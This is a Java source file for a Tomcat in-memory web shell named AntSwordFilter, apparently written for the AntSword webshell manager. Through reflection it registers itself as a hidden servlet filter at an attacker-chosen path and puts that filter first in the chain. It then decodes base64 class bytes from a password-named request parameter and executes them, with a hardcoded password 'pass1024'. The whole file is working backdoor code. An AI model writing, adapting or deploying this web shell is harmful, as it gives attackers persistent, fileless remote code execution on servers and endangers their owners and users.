package com.summersec.x;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.EnumSet;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.FilterRegistration.Dynamic;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.util.LifecycleBase;

public final class AntSwordFilter extends ClassLoader implements Filter {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs = "UTF-8";
    public String Pwd = "pass1024";
    public String path = "/favicondemo.ico";

    public AntSwordFilter() {
    }

    public AntSwordFilter(ClassLoader c) {
        super(c);
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        this.Pwd = this.request.getHeader("p");
        this.path = this.request.getHeader("path");
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.addFilter());
        } catch (Exception var7) {
            output.append("ERROR:// " + var7.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }

    }

    public String addFilter() throws Exception {
        ServletContext servletContext = this.request.getServletContext();
        Filter filter = this;
        String filterName = this.path;
        String url = this.path;
        if (servletContext.getFilterRegistration(filterName) == null) {
            Field contextField = null;
            ApplicationContext applicationContext = null;
            StandardContext standardContext = null;
            Field stateField = null;
            Dynamic filterRegistration = null;

            String var11;
            try {
                contextField = servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                applicationContext = (ApplicationContext)contextField.get(servletContext);
                contextField = applicationContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                standardContext = (StandardContext)contextField.get(applicationContext);
                stateField = LifecycleBase.class.getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext, LifecycleState.STARTING_PREP);
                filterRegistration = servletContext.addFilter(filterName, filter);
                filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
                Method filterStartMethod = StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext, (Object[])null);
                stateField.set(standardContext, LifecycleState.STARTED);
                var11 = null;

                Class filterMap;
                try {
                    filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                } catch (Exception var21) {
                    filterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
                }

                Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
                Object[] filterMaps = (Object[])((Object[])findFilterMaps.invoke(standardContext));

                for(int i = 0; i < filterMaps.length; ++i) {
                    Object filterMapObj = filterMaps[i];
                    findFilterMaps = filterMap.getMethod("getFilterName");
                    String name = (String)findFilterMaps.invoke(filterMapObj);
                    if (name.equalsIgnoreCase(filterName)) {
                        filterMaps[i] = filterMaps[0];
                        filterMaps[0] = filterMapObj;
                    }
                }

                String var25 = "Success";
                return var25;
            } catch (Exception var22) {
                var11 = var22.getMessage();
            } finally {
                stateField.set(standardContext, LifecycleState.STARTED);
            }

            return var11;
        } else {
            return "Filter already exists";
        }
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest)servletRequest;
        HttpServletResponse res = (HttpServletResponse)servletResponse;
        String cls = req.getParameter(this.Pwd);
        if (cls != null) {
            try {
                (new AntSwordFilter(this.getClass().getClassLoader())).g(this.base64Decode(cls)).newInstance().equals(new Object[]{req, res});
            } catch (Exception var8) {
            }
        }

    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])((byte[])clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str));
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object)null);
            return (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, str));
        }
    }

    public void init(FilterConfig filterConfig) throws ServletException {
    }

    public void destroy() {
    }
}
